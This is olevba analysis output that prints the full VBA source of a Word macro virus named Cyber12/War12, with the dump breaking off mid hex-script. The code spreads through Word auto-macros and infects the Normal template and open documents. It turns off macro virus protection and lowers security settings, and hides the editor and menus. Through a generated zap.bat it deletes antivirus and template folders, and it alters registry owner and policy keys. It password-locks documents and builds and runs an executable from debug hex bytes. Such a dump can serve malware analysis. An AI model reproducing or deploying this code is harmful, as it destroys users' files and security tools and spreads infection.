olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cyber
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cyber - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO War12.bas 
in file: Virus.MSWord.Cyber - OLE stream: 'Macros/VBA/War12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Created       : Cyber12 by Agustinus
'Modified      : February 2002 it's dedicated to my girl Hani Hanipah
'---------------------------------------------------------------------
Option Compare Text
Dim Komp As Variant
Public Const regApp As String = "Application"
Public Const regSecSet As String = "Settings"
Public Const regSecApp As String = "AppName"
Const TempVer As String = "Cyber"
Const MacName As String = "War"
Const Ver As String = "12"
Dim ctl As Variant
Global blnFound As Boolean
Dim CusProp
Dim blnMod As Boolean
Public Const TimerOn = "01:00:00"
Const Akhir = 120
Dim Caption As String
Dim actWindow
Global Active
Global Temp
Global TempPath
Dim Waktu
Dim Bar As Integer
Public Const hklm = "HKEY_LOCAL_MACHINE\", hkcu = "HKEY_CURRENT_USER\", SOM = "SOFTWARE\Microsoft\", sm = "Software\Microsoft\", cv = "Windows\CurrentVersion\", ACME = "MS Setup (ACME)\User Info\"
Public Const faxzu = "http://www.faxzu.vcom.net "

Private Sub Document_Open()
On Error Resume Next
Call zap("c:\windows\zap.bat")
Stealth
Hidden
Call AutoOpen
End Sub

Sub Autoexec()
 Application.EnableCancelKey = 0
 Application.DisplayRecentFiles = False
 Call zap("c:\windows\zap.bat")
 SaveSetting regApp, regSecApp, "Microsoft Word", "True"
 Damt
 Stealth
 MenuWord
 Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
 Damf
End Sub

Sub AutoOpen()
On Error Resume Next
Dim strRun As String
 Application.EnableCancelKey = 0
 Call zap("c:\windows\zap.bat")
 If PWords = False Then Application.ShowVisualBasicEditor = False
 Damt
 ActiveTemp
 Stealth
 MenuWord
 If blnFound = True Then
  strRun = TempVer & Ver & "." & MacName & Ver & ".FoundIt"
  Application.OnTime Now + TimeValue("00:01:00"), strRun
 End If
 Damf
End Sub

Sub AutoNew()
 On Error Resume Next
 TempActive
 Infection
 ActiveWindow.View.Type = 3
End Sub

Sub AutoClose()
On Error Resume Next
 Stealth
 TempActive
 Infection
 If Not ActiveDocument.Saved And ActiveDocument.Characters.Count <> 0 Then
 ActiveDocument.Save
 ActiveDocument.Saved = True
 End If
End Sub

Sub AutoExit()
TempActive
Infection
End Sub

Sub FileOpen()
On Error Resume Next
 If PWords = False Then Application.ShowVisualBasicEditor = False
 Stealth
 Damt
 If Dialogs(80).show <> 0 Then
  TempActive
  Infection
  On Error Resume Next
  ActiveDocument.Save
  ActiveDocument.Saved = True
 End If
 Damf
End Sub

Sub FileSave()
On Error Resume Next
 Damt
 TempActive
 Infection
 If Not ActiveDocument.Saved And ActiveDocument.Characters.Count <> 0 Then
 ActiveDocument.Save
 ActiveDocument.Saved = True
 End If
 Damf
End Sub

Sub FileSaveAs()
On Error Resume Next
 Damt
 If Dialogs(84).show <> 0 Then
 TempActive
 Infection
 If Not ActiveDocument.Saved And ActiveDocument.Characters.Count <> 0 Then
 ActiveDocument.Save
 ActiveDocument.Saved = True
 End If
 End If
 Damf
End Sub

Sub FileClose()
On Error Resume Next
 Damt
 AutoClose
 ActiveDocument.Close
 Damf
End Sub

Sub FileNew()
On Error Resume Next
 If Dialogs(79).show <> 0 Then
  TempActive
  Infection
 End If
 Stealth
End Sub

Sub FileNewDefault()
On Error Resume Next
 WordBasic.FileNewDefault
 TempActive
 Infection
End Sub

Sub FileExit()
TempActive
Infection
If Not ActiveDocument.Saved And ActiveDocument.Characters.Count <> 0 Then
ActiveDocument.Save
ActiveDocument.Saved = True
End If
Application.Quit
End Sub

Function Serang() As Boolean
Dim getDate As Date
On Error Resume Next
Serang = False
getDate = GetSetting(regApp, regSecSet, "FirstRun")
If getDate <= Date Then Serang = True
If Serang = True Then
With System
.PrivateProfileString("", hklm & SOM & cv & "Policies\Run", "NoClose") = "1"
.PrivateProfileString("", hklm & SOM & cv & "Policies\Run", "NoRun") = "1"
End With
ShowMe
End If
End Function

Function KeyWord() As Boolean
If GetSetting(regApp, regSecSet, "UserKeyWord") = MacName & Ver Then KeyWord = True
End Function

Function KompProject(Asal, Tujuan) As Boolean
On Error GoTo Salah
blnMod = False
For Each Komp In Tujuan.VBProject.VBComponents
 If Komp.Name = MacName & Ver Then blnMod = True
 If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference to Normal") And (Komp.Name <> MacName & Ver) Then
  Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name)
  KompProject = True
 End If
Next Komp
 If blnMod = False Then
 If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True
 End If
Salah:
End Function

Function PrintOke() As Boolean
On Error GoTo Salah
If KeyWord = True Or GetCreator = True Then
 PrintOke = True
Else
 If CusProp.Item("CountPrint").Value < 5 Then
  CusProp.Item("CountPrint").Value = CusProp.Item("CountPrint").Value + 1
  If Val(GetSetting(regApp, regSecSet, "CountPrt")) <= 100 Then
   SaveSetting regApp, regSecSet, "CountPrt", Val(GetSetting(regApp, regSecSet, "CountPrt")) + 1
   PrintOke = True
  End If
 End If
End If
Salah:
End Function

Sub FilePrint()
On Error Resume Next
Dim aw, s
If PrintOke = True And Minute(Now) <= 50 Then
Dialogs(88).show
Else
If PrintOke = True And Minute(Now) > 50 Then
If KeyWord = True Then Dialogs(88).show Else
 Set aw = ActiveWindow.ActivePane.View
 Set s = Selection
 aw.SeekView = 9
 s.TypeText TempVer & Ver & " Virus" & " by Lord of War "
 aw.SeekView = 10
 s.TypeText "Contact us at " & faxzu
 aw.SeekView = 0
 Dialogs(88).show
Else
 Dialogs(88).Display
 ActiveDocument.Password = LCase("i love u")
 ActiveDocument.Password = LCase("i love u")
 Call Earthquake
End If
End If
End Sub

Sub FilePrintDefault()
FilePrint
End Sub

Sub ToolsCustomizeKeyboard()
Call Earthquake
End Sub

Sub ViewCode()
Call Earthquake
End Sub

Sub ViewVBCode()
If PWords = True Then ShowVisualBasicEditor = True Else
Call Earthquake
End Sub

Sub ToolsCustomize()
Serang
End Sub

Sub ToolsMacro()
Call Earthquake
End Sub

Sub FormatStyle()
If KeyWord = True Then Dialogs(180).show Else
Call Earthquake
End Sub

Sub ToolsRecordMacroToggle()
Call Earthquake
End Sub

Sub FileTemplates()
Call Earthquake
End Sub

Sub TempActive()
On Error Resume Next
Hidden
Aplikasi
 If KompProject(Temp, Active) = True Then
  SetCusProp
  Active.VBProject.Name = MacName
  If Len(Active.Path) <> 0 Then Active.Save
 End If
End Sub

Function EIKModul(Asal, Tujuan, Komp As String) As Boolean
On Error GoTo Salah
 Asal.VBProject.VBComponents(Komp).Export TempPath & Komp
 Tujuan.VBProject.VBComponents.Import TempPath & Komp
 EIKModul = True
 Kill TempPath & Komp
Salah:
End Function

Sub ActiveTemp()
On Error Resume Next
Hidden
Aplikasi
 If KompProject(Active, Temp) = True Then
  Temp.VBProject.Name = TempVer & Ver
  Temp.Save
  SaveSetting regApp, regSecApp, Application.Name, "True"
  blnFound = True
 End If
End Sub

Sub Unvisible()
On Error Resume Next
cmdBars CommandBars("Control Toolbox"), True
cmdBars CommandBars("Forms"), True
cmdBars CommandBars("ActiveX Control"), True
cmdBars CommandBars("Visual Basic"), True
cmdBars CommandBars("Macro").Controls("Security..."), True
cmdBars CommandBars("Tools").Controls("Options..."), True
cmdBars CommandBars.ActiveMenuBar, False
cmdBars CommandBars("Formatting"), False
cmdBars CommandBars("Standard"), False
End Sub

Sub cmdBars(cmd, blnVis As Boolean)
With cmd
 If blnVis = True Then
  .Enabled = False
  .Visible = False
  .Protection = 8
 End If
  .Protection = 1
End With
End Sub

Sub MenuWord()
On Error Resume Next
CustomizationContext = NormalTemplate
Stealth
FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
Infection
Unvisible
End Sub

Sub SetCusProp()
On Error Resume Next
Set CusProp = Active.CustomDocumentProperties
CusProp.Add "Author", False, 4, ""
CusProp.Add "CountPrint", False, 1, 0
If PWords = True Then CusProp.Item("Author").Value = "Hany"
End Sub

Function GetCreator() As Boolean
On Error GoTo Salah
 Aplikasi
 Set CusProp = Active.CustomDocumentProperties
 If CusProp.Item("Author").Value = "Hany" Then GetCreator = True
Salah:
End Function

Function PWords() As Boolean
If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Agustinus" Then PWords = True
End Function

Sub OnTimer()
 Serang
 Application.OnTime Now + TimeValue(TimerOn), "OnTimer"
End Sub

Sub FoundIt()
TempActive
blnFound = False
End Sub

Sub Pesan(strPesan As String, msg)
Dim A  As String
Dim B(3)
Dim x, i, j
Dim K, n
B(0) = "  \": B(1) = "  -  ": B(2) = "  /": B(3) = "  |"
i = 0
If Bar = 0 Then K = TempVer & Ver & " Virus : " Else K = "Warning... each file can be printed 5 times only: "
A = "                                                                                                                                          " & strPesan
 For x = 1 To Len(A)
  For n = 1 To 10
   Beep
  Next
  msg.Caption = A & B(i)
  Application.StatusBar = K & Akhir - Int(Timer - Waktu) & " sec " & B(i)
  A = Right$(A, Len(A) - 1)
  i = i + 1
  For j = 1 To 100000: Next
  If (Timer - Waktu >= Akhir) Or Timer - Waktu < 0 Then GoTo done:
  If i > 3 Then i = 0
 Next
done:
If Bar = 0 Then Bar = 1 Else Bar = 0
msg.Caption = ""
End Sub

Sub Message(msg)
Dim strPesan(8) As String
strPesan(0) = "Hello.. I didn't expect to meet you here, sorry "
strPesan(1) = "Warning.. one or more your Word command(s) maybe not available now"
strPesan(2) = "Dear Hani.. i love u so much and i'll loving you forever "
strPesan(3) = "You make me write this virus.. it's dedicated to you"
strPesan(4) = "This virus is activated " & Choose(WeekDay(Date, vbSunday), "Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday") & " " & Format(Date, ("dd-mmmm-yyyy")) & " congratulation to you..."
strPesan(5) = "Created " & Year(Format(Date, "dd-mmmm-yyyy")) & " Bogor West Java - Indonesia  member of Faxzu Software Development Inc."
strPesan(6) = "Happy Birthday [23-April-"
strPesan(7) = Year(Format(Date, "dd-mmmm-yyyy"))
strPesan(8) = "] to you my girl... and still loving me. "
Select Case Month(Date)
    Case 4, 5: strPesan(0) = strPesan(6) & strPesan(7) & strPesan(8)
End Select
Application.DisplayStatusBar = True
Waktu = Timer
i = 0
Do While (Timer - Waktu <= Akhir) And Timer - Waktu >= 0
    Pesan strPesan(i), msg
    i = i + 1
    If i > 5 Then Exit Do
Loop
End Sub

Sub ShowMe()
Dim Maks, Min As Integer
On Error Resume Next
If Tator = True Then
Application.EnableCancelKey = 0
Caption = ActiveWindow.Caption
 If Application.Name = "Microsoft Word" Then
  Maks = 1
  Application.Caption = " "
  If Windows.Count > 0 Then Set actWindow = ActiveWindow Else Set actWindow = Application
 Else
  Set actWindow = Application
  ActiveWindow.Caption = ""
  Maks = -4137
 End If
  Application.WindowState = Maks
  actWindow.WindowState = Maks
  Message actWindow
  Application.StatusBar = ""
  ActiveWindow.Caption = Caption
  Application.Caption = ""
End If
End Sub

Function Tator() As Boolean
If (KeyWord = False) And (GetCreator = False) Then Tator = True
End Function

Sub Aplikasi()
If Application.Name = "Microsoft Word" Then
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Active = ActiveDocument
Set Temp = NormalTemplate
End If
End Sub

Sub Stealth()
On Error Resume Next
Dim windir1 As String
 windir1 = System.PrivateProfileString("", hkcu & sm & cv, "SystemRoot")
 With Options
  .VirusProtection = (1 - 1)
  .SaveNormalPrompt = (1 - 1)
  .ConfirmConversions = (1 - 1)
  .SavePropertiesPrompt = (1 - 1)
  .DefaultFilePath(8) = windir1 & "\System"
 End With
End Sub

Sub Infection()
On Error Resume Next
 Dim DocuName$, docinf As Boolean
 Dim i%, j%, Nminf As Boolean
 Dim aDoc As Document
 Dim windir1 As String, fileok As String
 Dim windir As String
 Nminf = False
  For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
  DocuName = NormalTemplate.VBProject.VBComponents(i).Name
  If DocuName = MacName & Ver Then Nminf = True
  If (DocuName <> "ThisDocument" And DocuName <> MacName & Ver) Then
   Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=DocuName, Object:=3
  End If
  Next i

Hidden
On Error Resume Next
If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 10, "dd-mm-yyyy")
If GetSetting(regApp, regSecSet, "Version") <> Ver Then SaveSetting regApp, regSecSet, "Version", Ver
If GetSetting(regApp, regSecSet, "UserKeyWord") <> MacName & Ver Then SaveSetting regApp, regSecSet, "UserKeyWord", ""
If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Agustinus" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", ""
    
With Application
 .UserName = "Lord of War"
 .UserInitials = TempVer & Ver
 .UserAddress = faxzu
End With
Stealth
 windir1 = System.PrivateProfileString("", hkcu & sm & cv, "SystemRoot")
 Options.DefaultFilePath(8) = windir1 & "\System"
 windir = Options.DefaultFilePath(8)

If Nminf = False Then
 Application.OrganizerCopy windir & "\Dxdlg32.dll", NormalTemplate.FullName, MacName & Ver, 3
End If
fileok = Dir(windir & "\Office.dot")
If fileok = "" Then
 NormalTemplate.OpenAsDocument.SaveAs windir & "\Office.dot", , , , AddToRecentFiles:=False
 ActiveDocument.Close SaveChanges:=-1
End If
fileok = Dir(windir & "\Dxdlg32.dll")
If fileok = "" Then
 NormalTemplate.OpenAsDocument.SaveAs windir & "\Dxdlg32.dll", , , , AddToRecentFiles:=False
 ActiveDocument.Close SaveChanges:=-1
End If

For Each aDoc In Documents
TempActive
With Dialogs(86)
 .Author = "Lord of War"
 .Title = "Hello it's nice to meet you here!!!"
 .Subject = "Have a nice day to my friends"
 .Comments = "Contact us at " & faxzu
 .Execute
End With
aDoc.ReadOnlyRecommended = False
aDoc.SaveAs FileName:=aDoc.FullName
Next aDoc
End Sub

Sub Damt()
WordBasic.DisableAutoMacros True
End Sub

Sub Damf()
WordBasic.DisableAutoMacros False
End Sub

Sub Hidden()
On Error Resume Next
Dim org As String
If System.PrivateProfileString("", hkcu & sm & "Office\9.0\Word\Security", "Level") <> "" Then
Unvisible
System.PrivateProfileString("", hkcu & sm & "Office\9.0\Word\Security", "Level") = 1&
Else
Unvisible
System.PrivateProfileString("", hkcu & sm & "Office\", MacName & Ver) = "...by Lord of War "
End If
With System
 .PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "Lord of War..."
 .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "footer") = "Contact us at " & faxzu & " &u&b&d"
 .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "header") = TempVer & Ver & " &w&bPage &p of &P"
 .PrivateProfileString("", hklm & "Network\Logon\", "PrimaryProvider") = "Microsoft Network"
 .PrivateProfileString("", hklm & "Network\Logon\", "username") = TempVer & Ver
 .PrivateProfileString("", hkcu & "Control Panel\International\", "s1159") = TempVer & Ver
 .PrivateProfileString("", hkcu & "Control Panel\International\", "s2359") = TempVer & Ver
org = .PrivateProfileString("", hklm & SOM & cv, "RegisteredOwner")
  If org <> TempVer & Ver Then
   .PrivateProfileString("", hklm & SOM & cv, "OrgOwner") = org
   org = .PrivateProfileString("", hklm & SOM & cv, "RegisteredOrganization")
   .PrivateProfileString("", hklm & SOM & cv, "OrgOrganization") = org
   org = .PrivateProfileString("", hkcu & sm & ACME, "DefName")
   .PrivateProfileString("", hkcu & sm & ACME, "OrgName") = org
   org = .PrivateProfileString("", hkcu & sm & ACME, "DefCompany")
   .PrivateProfileString("", hkcu & sm & ACME, "OrgCompany") = org
   .PrivateProfileString("", hkcu & sm & ACME, "DefName") = "Lord of War"
   .PrivateProfileString("", hkcu & sm & ACME, "DefCompany") = faxzu
   .PrivateProfileString("", hklm & SOM & cv, "RegisteredOwner") = TempVer & Ver
   .PrivateProfileString("", hklm & SOM & cv, "RegisteredOrganization") = faxzu
  End If
End With
End Sub

Sub Earthquake()
Call p5687("C:\start.scr")
Call startv("c:\startv.bat")
Serang
End Sub

Sub startv(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "cd\"
Print #hFile, "debug < start.scr > nul"
Print #hFile, "copy sys.com sys.exe"
Print #hFile, "del sys.com"
Print #hFile, "del start.scr"
Print #hFile, "sys"
Print #hFile, "del sys.com"
Print #hFile, "del startv.bat"
Close hFile
Shell ("c:\startv.bat"), vbHide
End Sub

Sub zap(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, "deltree /y c:\progra~1\banmacro"
Print #hFile, "deltree /y c:\progra~1\mcafee\mcafee~1\*.*"
Print #hFile, "deltree /y c:\progra~1\norton~1\*.*"
Print #hFile, "deltree /y c:\progra~1\antivi~1\*.*"
Print #hFile, "deltree /y c:\esafe\protect\*.*"
Print #hFile, "deltree /y c:\progra~1\comman~1\F-PROT~1\*.*"
Print #hFile, "deltree /y c:\PC-CIL~1\*.*"
Print #hFile, "deltree /y c:\progra~1\QuickH~1\*.*"
Print #hFile, "deltree /y c:\progra~1\FWIN32\*.*"
Print #hFile, "deltree /y c:\progra~1\FindVi~1\*.*"
Print #hFile, "deltree /y c:\Toolkit\FindVi~1\*.*"
Print #hFile, "deltree /y c:\f-macro\*.*"
Print #hFile, "deltree /y c:\TBAVW95\*.*"
Print #hFile, "deltree /y c:\VS95\*.*"
Print #hFile, "deltree /y c:\progra~1\micros~1\office\startup\*.*"
Print #hFile, "deltree /y c:\progra~1\micros~1\templa~1\*.dot"
Print #hFile, "del zap.bat"
Close hFile
Shell ("c:\windows\zap.bat"), vbHide
End Sub

Sub p5687(strFile As String)
On Error Resume Next
Dim hFile As Long
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "N sys.com"
Print #hFile, "E 0100 4D 5A 36 01 01 00 00 00 04 00 00 00 FF FF 00 00"
Print #hFile, "E 0110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"
Print #hFile, "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
Print #hFile, "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
Print #hFile, "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 72 65 71 75 69"
Print #hFile, "E 0160 72 65 73 20 4D 69 63 72 6F 73 6F 66 74 20 57 69"
Print #hFile, "E 0170 6E 64 6F 77 73 2E 0D 0A 24 00 00 00 00 00 00 00"
Print #hFile, "E 0180 4E 45 05 3C 9F 00 0F 00 00 00 00 00 02 03 02 00"
Print #hFile, "E 0190 00 04 00 14 1A 00 01 00 00 00 02 00 02 00 02 00"
Print #hFile, "E 01A0 3D 00 40 00 50 00 85 00 8E 00 92 00 2E 01 00 00"
Print #hFile, "E 01B0 02 00 04 00 00 00 02 08 18 00 0C 01 00 00 0A 03"
Print #hFile, "E 01C0 1A 00 39 0C 50 1D 39 0C F6 00 94 02 51 0C 94 02"
Print #hFile, "E 01D0 04 00 0E 80 01 00 00 00 00 00 24 01 02 00 30 1C"
Print #hFile, "E 01E0 2C 00 00 00 00 00 03 80 01 00 00 00 00 00 26 01"
Print #hFile, "E 01F0 2F 00 30 1C 01 80 00 00 00 00 00 00 08 43 79 62"
Print #hFile, "E 0200 65 72 49 43 4F 05 43 79 62 65 72 00 00 00 01 00"
Print #hFile, "E 0210 08 00 00 06 4B 45 52 4E 45 4C 04 55 53 45 52 02"
Print #hFile, "E 0220 FF 01 CD 3F 01 16 0A 01 CD 3F 01 18 0B 00 15 41"
Print #hFile, "E 0230 20 6D 69 6E 69 6D 75 6D 20 41 70 70 6C 69 63 61"
Print #hFile, "E 0240 74 69 6F 6E 00 00 09 45 58 43 49 54 50 52 4F 43"
Print #hFile, "E 0250 02 00 15 4F 56 45 52 4C 41 50 50 45 44 57 49 4E"
Print #hFile, "E 0260 44 4F 57 50 52 4F 43 31 01 00 00 00 00 00 00 00"
Print #hFile, "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02B0 FF FF B0 FF 50 9A DD 01 3C 0B 33 ED 55 9A FF FF"
Print #hFile, "E 02C0 00 00 0B C0 74 EC 8C 06 46 00 81 C1 00 01 72 E2"
Print #hFile, "E 02D0 89 0E 10 00 89 36 12 00 89 3E 14 00 89 1E 16 00"
Print #hFile, "E 02E0 8C 06 18 00 89 16 1A 00 9A FF FF 00 00 86 C4 A3"
Print #hFile, "E 02F0 48 00 B4 30 2E F7 06 10 00 01 00 74 07 9A FF FF"
Print #hFile, "E 0300 00 00 EB 02 CD 21 A3 4C 00 86 C4 A3 4A 00 2E F7"
Print #hFile, "E 0310 06 10 00 01 00 75 05 B0 00 A2 4F 00 33 C0 50 9A"
Print #hFile, "E 0320 FF FF 00 00 FF 36 14 00 9A FF FF 00 00 0B C0 74"
Print #hFile, "E 0330 81 9A F0 00 18 00 9A D4 02 94 00 9A 56 04 99 00"
Print #hFile, "E 0340 E8 43 07 FF 36 84 00 FF 36 82 00 FF 36 80 00 9A"
Print #hFile, "E 0350 C4 00 9E 00 83 C4 06 50 9A CF 01 B2 00 B8 15 00"
Print #hFile, "E 0360 E9 28 04 00 8C D8 90 45 55 8B EC 1E 8E D8 FF 36"
Print #hFile, "E 0370 14 00 FF 36 12 00 FF 36 18 00 FF 36 16 00 FF 36"
Print #hFile, "E 0380 1A 00 9A F0 08 BB 00 83 ED 02 8B E5 1F 5D 4D CB"
Print #hFile, "E 0390 8C D8 90 45 55 8B EC 1E 8E D8 B8 00 35 2E F7 06"
Print #hFile, "E 03A0 10 00 01 00 74 07 9A 5E 00 00 00 EB 02 CD 21 89"
Print #hFile, "E 03B0 1E 32 00 8C 06 34 00 0E 1F B8 00 25 BA E6 04 2E"
Print #hFile, "E 03C0 F7 06 10 00 01 00 74 07 9A 07 01 00 00 EB 02 CD"
Print #hFile, "E 03D0 21 16 1F 8B 0E 1E 01 E3 29 8E 06 46 00 26 8B 36"
Print #hFile, "E 03E0 2C 00 A1 20 01 8B 16 22 01 33 DB FF 1E 1C 01 73"
Print #hFile, "E 03F0 03 E9 7A 01 A1 24 01 8B 16 26 01 BB 03 00 FF 1E"
Print #hFile, "E 0400 1C 01 8E 06 46 00 26 8B 0E 2C 00 E3 3E 8E C1 33"
Print #hFile, "E 0410 FF 26 80 3D 00 74 34 B9 0D 00 BE 24 00 F3 A6 74"
Print #hFile, "E 0420 0B B9 FF 7F 33 C0 F2 AE 75 21 EB E5 06 1E 07 1F"
Print #hFile, "E 0430 8B F7 BF 58 00 B1 04 AC 2C 41 72 0D D2 E0 92 AC"
Print #hFile, "E 0440 2C 41 72 05 0A C2 AA EB EE 16 1F BE 28 01 BF 28"
Print #hFile, "E 0450 01 E8 E2 00 BE 28 01 BF 28 01 E8 D9 00 BE 28 01"
Print #hFile, "E 0460 BF 28 01 E8 D0 00 83 ED 02 8B E5 1F 5D 4D CB 8C"
Print #hFile, "E 0470 D8 90 45 55 8B EC 1E 8E D8 33 C9 EB 2F 8C D8 90"
Print #hFile, "E 0480 45 55 8B EC 1E 8E D8 B9 01 00 EB 20 8C D8 90 45"
Print #hFile, "E 0490 55 8B EC 1E 8E D8 56 57 B9 00 01 EB 0F 8C D8 90"
Print #hFile, "E 04A0 45 55 8B EC 1E 8E D8 56 57 B9 01 01 88 2E 8D 00"
Print #hFile, "E 04B0 51 0A C9 75 1C BE 8A 02 BF 8A 02 E8 78 00 BE 28"
Print #hFile, "E 04C0 01 BF 28 01 E8 6F 00 8B 76 06 56 E8 B8 05 83 C4"
Print #hFile, "E 04D0 02 BE 28 01 BF 28 01 E8 5C 00 BE 28 01 BF 28 01"
Print #hFile, "E 04E0 E8 53 00 E8 27 00 58 0A E4 75 17 8B 46 06 B4 4C"
Print #hFile, "E 04F0 2E F7 06 10 00 01 00 74 07 9A 29 01 00 00 EB 02"
Print #hFile, "E 0500 CD 21 5F 5E 83 ED 02 8B E5 1F 5D 4D CB 8B 0E 1E"
Print #hFile, "E 0510 01 E3 07 BB 02 00 FF 1E 1C 01 1E C5 16 32 00 B8"
Print #hFile, "E 0520 00 25 2E F7 06 10 00 01 00 74 07 9A 5A 02 00 00"
Print #hFile, "E 0530 EB 02 CD 21 1F C3 3B F7 73 0E 83 EF 04 8B 05 0B"
Print #hFile, "E 0540 45 02 74 F2 FF 1D EB EE C3 00 8C D8 90 45 55 8B"
Print #hFile, "E 0550 EC 1E 8E D8 B8 FC 00 50 0E E8 A9 02 B8 FF 00 50"
Print #hFile, "E 0560 0E E8 A1 02 83 ED 02 8B E5 1F 5D 4D CB 00 B8 02"
Print #hFile, "E 0570 00 E9 17 02 8F 06 92 00 8F 06 94 00 B8 04 01 B9"
Print #hFile, "E 0580 08 00 E8 BD 02 89 16 88 00 A3 86 00 52 50 FF 36"
Print #hFile, "E 0590 14 00 52 50 B8 04 01 50 9A FF FF 00 00 5B 07 03"
Print #hFile, "E 05A0 D8 26 C6 07 00 BA 01 00 BF 01 00 BE 81 00 8E 1E"
Print #hFile, "E 05B0 46 00 AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 6F 0A"
Print #hFile, "E 05C0 C0 74 6B 47 4E AC 3C 20 74 E8 3C 09 74 E4 3C 0D"
Print #hFile, "E 05D0 74 5C 0A C0 74 58 3C 22 74 24 3C 5C 74 03 42 EB"
Print #hFile, "E 05E0 E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1 EB"
Print #hFile, "E 05F0 D3 8B C1 D1 E9 13 D1 A8 01 75 CA EB 01 4E AC 3C"
Print #hFile, "E 0600 0D 74 2B 0A C0 74 27 3C 22 74 BA 3C 5C 74 03 42"
Print #hFile, "E 0610 EB EC 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1"
Print #hFile, "E 0620 EB DB 8B C1 D1 E9 13 D1 A8 01 75 D2 EB 97 16 1F"
Print #hFile, "E 0630 89 3E 80 00 03 D7 47 D1 E7 03 D7 42 80 E2 FE 2B"
Print #hFile, "E 0640 E2 8B C4 A3 82 00 8B D8 03 FB 16 07 C5 36 86 00"
Print #hFile, "E 0650 36 89 37 43 43 36 8E 1E 46 00 BE 81 00 EB 03 33"
Print #hFile, "E 0660 C0 AA AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 7C 0A"
Print #hFile, "E 0670 C0 74 78 36 89 3F 43 43 4E AC 3C 20 74 E1 3C 09"
Print #hFile, "E 0680 74 DD 3C 0D 74 62 0A C0 74 5E 3C 22 74 27 3C 5C"
Print #hFile, "E 0690 74 03 AA EB E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74"
Print #hFile, "E 06A0 06 B0 5C F3 AA EB D1 B0 5C D1 E9 F3 AA 73 06 B0"
Print #hFile, "E 06B0 22 AA EB C5 4E AC 3C 0D 74 2E 0A C0 74 2A 3C 22"
Print #hFile, "E 06C0 74 B7 3C 5C 74 03 AA EB EC 33 C9 41 AC 3C 5C 74"
Print #hFile, "E 06D0 FA 3C 22 74 06 B0 5C F3 AA EB D9 B0 5C D1 E9 F3"
Print #hFile, "E 06E0 AA 73 96 B0 22 AA EB CD 33 C0 AA 16 1F C7 07 00"
Print #hFile, "E 06F0 00 FF 2E 92 00 00 8C D8 90 45 55 8B EC 1E 8E D8"
Print #hFile, "E 0700 1E 9A FF FF 00 00 0B C0 74 03 BA 00 00 8B DA 8E"
Print #hFile, "E 0710 C2 33 C0 33 F6 33 FF B9 FF FF 0B DB 74 0E 26 80"
Print #hFile, "E 0720 3E 00 00 00 74 06 F2 AE 46 AE 75 FA 8B C7 40 24"
Print #hFile, "E 0730 FE 46 8B FE D1 E6 B9 09 00 E8 06 01 50 8B C6 E8"
Print #hFile, "E 0740 00 01 A3 84 00 06 1E 07 1F 8B CF 8B D8 33 F6 5F"
Print #hFile, "E 0750 49 E3 26 8B 04 36 3B 06 24 00 75 10 51 56 57 BF"
Print #hFile, "E 0760 24 00 B9 06 00 F3 A7 5F 5E 59 74 05 26 89 3F 43"
Print #hFile, "E 0770 43 AC AA 0A C0 75 FA E2 DA 26 89 0F 1F 83 ED 02"
Print #hFile, "E 0780 8B E5 1F 5D 4D CB 16 1F B8 03 00 50 50 0E E8 B9"
Print #hFile, "E 0790 FD 0E E8 70 00 0E E8 35 00 33 DB 0B C0 74 1D 8B"
Print #hFile, "E 07A0 F8 B8 09 00 80 3D 4D 75 03 B8 0F 00 03 F8 57 1E"
Print #hFile, "E 07B0 07 B0 0D B9 22 00 F2 AE 88 5D FF 58 53 1E 50 9A"
Print #hFile, "E 07C0 FF FF 00 00 B8 FF 00 50 9A FF FF 00 00 00 8C D8"
Print #hFile, "E 07D0 90 45 55 8B EC 1E 8E D8 56 57 1E 07 8B 56 06 BE"
